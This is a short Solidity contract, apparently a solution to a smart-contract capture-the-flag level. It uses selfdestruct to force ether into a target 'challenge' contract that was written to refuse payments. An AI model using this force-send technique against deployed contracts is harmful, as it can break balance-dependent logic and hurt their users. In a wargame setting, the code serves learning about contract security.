// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceSolver {
    function bye(address challenge) public payable {
        selfdestruct(payable(challenge));
    }
}
